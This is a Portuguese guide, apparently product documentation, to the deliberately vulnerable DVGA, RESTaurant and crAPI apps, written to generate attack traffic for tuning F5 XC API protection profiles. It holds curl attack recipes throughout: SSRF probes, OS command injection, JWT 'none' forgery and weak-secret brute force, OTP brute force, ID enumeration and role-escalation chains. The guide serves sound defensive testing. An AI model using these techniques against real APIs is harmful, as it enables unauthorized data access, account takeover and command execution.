...
description: >-
  ...
  de tráfego e desenvolvimento de perfis de proteção de API do F5 XC
sidebar:
  order: 8
i18n:
...
Este guia cataloga cada endpoint de API, vulnerabilidade intencional e payload de ataque nas três aplicações de teste de segurança de API. Use-o para construir padrões de geração de tráfego para o desenvolvimento de perfis de proteção de API do F5 XC.
...
Todas as interações do DVGA utilizam um único endpoint (`/dvga/graphql`) com requisições POST contendo payloads JSON `{"query":"..."}`.
...
| `systemDiagnostics(cmd)` | Query | admin/password | Executar comandos OS permitidos |
...
**SSRF via importPaste (sondagem de serviços internos):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**Comando OS via systemDiagnostics (requer autenticação de admin):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
| `/restaurant/profile` | GET | Sim | Qualquer | Perfil de usuário |
...
| `/restaurant/orders/{order_id}` | GET | Sim | Qualquer | **BOLA** (acessar outros pedidos) |
...
| `/restaurant/referral-code` | GET | Sim | Qualquer | Obter código de referência |
| `/restaurant/apply-referral` | POST | Sim | Qualquer | Aplicar referência |
...
**Modificar perfil de outro usuário:**
```bash
...
**Força bruta do segredo fraco do JWT (segredo é 6 dígitos: 97952):**
```bash
...
#### API3:2023 — Autorização em Nível de Propriedade de Objeto Quebrada (BOPLA)
...
#### API5:2023 — Autorização em Nível de Função Quebrada (BFLA)

**Excluir item do menu como Customer (deveria requerer Employee+):**
```bash
...
```bash
# Primeiro escalar para Employee via BOPLA, depois:
...
# 4. Reautenticar para obter token de nível Chef
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
...
# Acesse ${CRAPI}/mailhog/ ou use a API do MailHog:
...
| `/identity/api/v2/user/dashboard` | GET | Sim | Perfil de usuário |
...
| `/community/api/v2/community/posts` | POST | Sim | Criar post de blog |
...
```bash
# Obter seu UUID de veículo primeiro
curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
  -H "Authorization: Bearer ${TOKEN}"

# Acessar veículo de outro usuário (substituir UUID)
curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
  -H "Authorization: Bearer ${TOKEN}"
```

#### Desafio 2 — BOLA: Acessar Relatórios de Mecânico (Sem Autenticação)

```bash
# Enumeração de ID sequencial — sem necessidade de token
for i in 1 2 3 4 5; do
  echo "Report $i:"
...
#### Desafio 3 — Autenticação Quebrada: Força Bruta de OTP de Redefinição de Senha
...
```bash
# Fazer upload de um vídeo, depois inspecionar a resposta
curl -sf ${CRAPI}/identity/api/v2/user/videos \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
# Procurar pelo campo conversion_params na resposta
```
...
```bash
# Usuário comum pode acessar endpoint de admin
...
```bash
# Mudar GET para PUT, modificar status e quantidade
...
#### Desafio 14 — Acesso a Pedido Sem Autenticação

```bash
# Sem header Authorization — ainda retorna dados
for i in 1 2 3 4 5; do
...
```bash
# Falsificar um JWT com algoritmo "none" (sem verificação de assinatura):
...
# 3. Juntar com pontos, deixar assinatura vazia: <header>.<payload>.
...
|---|---|---|---|
| **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | Localização de veículo, relatórios de mecânico, pedidos |
| **API2: Autenticação Quebrada** | Falsificação JWT (query `me`) | Segredo fraco do JWT (97952) | Força bruta de OTP (v2), confusão de algoritmo JWT |
| **API3: BOPLA** | — | `PATCH /profile` (escalação de papel) | Video conversion_params, exposição de e-mail de mecânico |
| **API4: Consumo de Recursos** | DoS por lote, recursão, alias, duplicação de campos | Enumeração de usuários via tamanho de resposta | DoS via repeat_request de `contact_mechanic` |
| **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | `DELETE /admin/videos` como usuário comum |
...
| **API9: Ativos Inadequados** | — | — | `/auth/v2/check-otp` depreciado (sem limite de taxa) |
| **API10: Consumo Inseguro** | — | — | (indireto via SSRF) |
| **Específico de GraphQL** | Introspecção, lote, recursão, aliases, duplicação de campos, fragmentos circulares | — | — |
...
**Teste de BOLA:** Enumerar IDs sequenciais, trocar identificadores de usuário nas requisições, acessar recursos sem propriedade.

**Teste de injeção:** Payloads SQL em parâmetros de filtro/cupom, injeção de query GraphQL, injeção de comando OS via campos de parâmetro.

**Teste de bypass de autenticação:** Falsificar tokens JWT, força bruta de OTPs, usar versões depreciadas da API, confusão de algoritmo.

**Teste de SSRF:** URLs internas nos parâmetros `importPaste`, `image_url` e `mechanic_api`.

**Teste de DoS:** Ataques GraphQL de lote/recursão/alias, `repeat_request_if_failed` com contagens altas.

### Fase 3: Cadeias de Ataque com Estado

Alguns ataques requerem sequências multi-etapa com estado:

1. **Cadeia de escalação RESTaurant:** Registrar → Token → PATCH de papel para Chef → Reautenticar → Injeção de comando
...
3. **Reconhecimento-para-exploração DVGA:** Introspecção → Descobrir systemDiagnostics → Força bruta de credenciais de admin → Execução de comando OS
...
| Enumeração BOLA | 100-500 | 2 min | Varredura de ID sequencial |
...
| Sondagem SSRF | 5-20 | 2 min | Lento; cada uma dispara requisição HTTP no lado do servidor |
